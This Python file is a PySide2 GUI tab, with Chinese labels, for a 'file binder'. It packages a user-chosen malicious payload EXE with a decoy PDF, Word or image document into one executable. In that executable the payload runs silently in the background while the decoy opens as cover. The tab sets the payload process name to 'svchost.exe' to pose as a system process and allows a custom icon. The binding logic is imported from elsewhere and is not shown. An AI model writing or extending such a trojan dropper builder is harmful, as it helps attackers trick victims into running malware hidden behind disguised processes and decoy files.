import os
from PySide2.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QComboBox, QPushButton, QGroupBox,
    QFileDialog, QTextEdit, QScrollArea, QFrame,
    QProgressBar
)
from PySide2.QtCore import Qt, QThread, Signal
from generators.binder_generator import generate_binder_exe, generate_stub_only


class BuildThread(QThread):
    """后台编译线程，避免 PyInstaller 编译时阻塞 GUI"""
    finished = Signal(bool, str)

    def __init__(self, payload_path, decoy_path, output_filename,
                 payload_run_name, icon_path, parent=None):
        super().__init__(parent)
        self.payload_path = payload_path
        self.decoy_path = decoy_path
        self.output_filename = output_filename
        self.payload_run_name = payload_run_name
        self.icon_path = icon_path

    def run(self):
        success, message = generate_binder_exe(
            self.payload_path, self.decoy_path,
            self.output_filename, self.payload_run_name,
            self.icon_path
        )
        self.finished.emit(success, message)


class BinderTab(QWidget):
    def __init__(self):
        super().__init__()
        self.build_thread = None
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setFrameShape(QFrame.NoFrame)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content = QWidget()
        content_layout = QVBoxLayout(scroll_content)
        content_layout.setContentsMargins(20, 20, 20, 20)
        content_layout.setSpacing(12)

        # 标题
        title = QLabel("文件捆绑器")
        title.setObjectName("titleLabel")
        content_layout.addWidget(title)

        subtitle = QLabel(
            "将 Payload EXE 与诱饵文档捆绑为单个 EXE。"
            "目标双击后，后台静默运行 Payload，前台自动打开正常文档作为掩护。"
            "最终交付物是一个独立的 EXE 文件。"
        )
        subtitle.setObjectName("subtitleLabel")
        subtitle.setWordWrap(True)
        content_layout.addWidget(subtitle)

        # --- 文件选择 ---
        file_group = QGroupBox("文件选择")
        file_layout = QVBoxLayout()

        payload_row = QHBoxLayout()
        payload_row.addWidget(QLabel("Payload EXE:"))
        self.payload_input = QLineEdit()
        self.payload_input.setPlaceholderText("选择要捆绑的恶意 EXE 程序")
        payload_row.addWidget(self.payload_input, 1)
        self.payload_btn = QPushButton("浏览")
        self.payload_btn.clicked.connect(self.select_payload)
        payload_row.addWidget(self.payload_btn)
        file_layout.addLayout(payload_row)

        decoy_row = QHBoxLayout()
        decoy_row.addWidget(QLabel("诱饵文档:"))
        self.decoy_input = QLineEdit()
        self.decoy_input.setPlaceholderText("选择掩护用的正常文档（PDF/Word/Excel/图片等）")
        decoy_row.addWidget(self.decoy_input, 1)
        self.decoy_btn = QPushButton("浏览")
        self.decoy_btn.clicked.connect(self.select_decoy)
        decoy_row.addWidget(self.decoy_btn)
        file_layout.addLayout(decoy_row)

        icon_row = QHBoxLayout()
        icon_row.addWidget(QLabel("EXE 图标:"))
        self.icon_input = QLineEdit()
        self.icon_input.setPlaceholderText("可选：自定义图标文件（.ico），不选则使用默认图标")
        icon_row.addWidget(self.icon_input, 1)
        self.icon_btn = QPushButton("浏览")
        self.icon_btn.clicked.connect(self.select_icon)
        icon_row.addWidget(self.icon_btn)
        file_layout.addLayout(icon_row)

        file_group.setLayout(file_layout)
        content_layout.addWidget(file_group)

        # --- 输出设置 ---
        settings_group = QGroupBox("输出设置")
        settings_layout = QVBoxLayout()

        mode_row = QHBoxLayout()
        mode_row.addWidget(QLabel("生成模式:"))
        self.mode_selector = QComboBox()
        self.mode_selector.addItems([
            "编译为 EXE（需要 PyInstaller）",
            "仅生成 Stub 脚本（手动编译）"
        ])
        mode_row.addWidget(self.mode_selector, 1)
        settings_layout.addLayout(mode_row)

        name_row = QHBoxLayout()
        name_row.addWidget(QLabel("进程伪装名:"))
        self.run_name_input = QLineEdit()
        self.run_name_input.setPlaceholderText("Payload 释放后的进程名（伪装为系统进程）")
        self.run_name_input.setText("svchost.exe")
        name_row.addWidget(self.run_name_input, 1)
        settings_layout.addLayout(name_row)

        output_row = QHBoxLayout()
        output_row.addWidget(QLabel("输出文件名:"))
        self.output_input = QLineEdit()
        self.output_input.setText("demo.exe")
        output_row.addWidget(self.output_input, 1)
        settings_layout.addLayout(output_row)

        settings_group.setLayout(settings_layout)
        content_layout.addWidget(settings_group)

        # --- 编译进度 ---
        progress_group = QGroupBox("编译状态")
        progress_layout = QVBoxLayout()

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)  # 不确定进度模式
        self.progress_bar.setVisible(False)
        progress_layout.addWidget(self.progress_bar)

        self.progress_label = QLabel("")
        self.progress_label.setObjectName("subtitleLabel")
        progress_layout.addWidget(self.progress_label)

        progress_group.setLayout(progress_layout)
        content_layout.addWidget(progress_group)

        # --- 输出信息 ---
        output_group = QGroupBox("输出信息")
        output_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setMaximumHeight(200)
        self.output_text.setStyleSheet(
            "font-family: 'Consolas','JetBrains Mono',monospace; font-size: 12px;"
        )
        output_layout.addWidget(self.output_text)
        output_group.setLayout(output_layout)
        content_layout.addWidget(output_group)

        content_layout.addStretch()
        scroll_area.setWidget(scroll_content)
        main_layout.addWidget(scroll_area, 1)

        # --- 底部 ---
        bottom_bar = QWidget()
        bottom_bar.setObjectName("bottomBar")
        bottom_layout = QHBoxLayout(bottom_bar)
        bottom_layout.setContentsMargins(20, 12, 20, 12)

        self.generate_btn = QPushButton("🚀 生成捆绑 EXE")
        self.generate_btn.setObjectName("primaryButton")
        self.generate_btn.setMinimumHeight(40)
        self.generate_btn.setMinimumWidth(160)
        self.generate_btn.clicked.connect(self.generate)
        bottom_layout.addWidget(self.generate_btn)

        bottom_layout.addStretch()

        self.status_label = QLabel("")
        bottom_layout.addWidget(self.status_label)

        main_layout.addWidget(bottom_bar)

    def select_payload(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "选择 Payload EXE", "",
            "可执行文件 (*.exe);;所有文件 (*.*)"
        )
        if path:
            self.payload_input.setText(path)

    def select_decoy(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "选择诱饵文档", "",
            "文档文件 (*.pdf *.docx *.doc *.xlsx *.xls *.pptx *.txt *.jpg *.png);;所有文件 (*.*)"
        )
        if path:
            self.decoy_input.setText(path)

    def select_icon(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "选择图标文件", "",
            "图标文件 (*.ico);;所有文件 (*.*)"
        )
        if path:
            self.icon_input.setText(path)

    def generate(self):
        payload = self.payload_input.text().strip()
        decoy = self.decoy_input.text().strip()
        run_name = self.run_name_input.text().strip() or "svchost.exe"
        output_fn = self.output_input.text().strip() or "demo.exe"
        icon = self.icon_input.text().strip() or None
        mode = self.mode_selector.currentIndex()

        if not payload:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText("❌ 请选择 Payload EXE 文件")
            return
        if not decoy:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText("❌ 请选择诱饵文档")
            return

        if mode == 1:
            # 仅生成 stub 脚本
            stub_fn = os.path.splitext(output_fn)[0] + ".py"
            success, message = generate_stub_only(payload, decoy, stub_fn, run_name)
            if success:
                self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
                self.status_label.setText("✅ Stub 脚本生成成功")
            else:
                self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
                self.status_label.setText(f"❌ {message}")
            self.output_text.setText(message)
            return

        # 编译模式 - 使用后台线程
        self.generate_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.progress_label.setText("正在编译，PyInstaller 打包中，请稍候...")
        self.status_label.setText("⏳ 编译中...")
        self.status_label.setStyleSheet("color: #fdcb6e; font-weight: bold;")

        self.build_thread = BuildThread(payload, decoy, output_fn, run_name, icon)
        self.build_thread.finished.connect(self.on_build_finished)
        self.build_thread.start()

    def on_build_finished(self, success, message):
        self.generate_btn.setEnabled(True)
        self.progress_bar.setVisible(False)
        self.progress_label.setText("")
        self.output_text.setText(message)

        if success:
            self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
            self.status_label.setText("✅ 捆绑 EXE 生成成功")
        else:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText("❌ 生成失败")
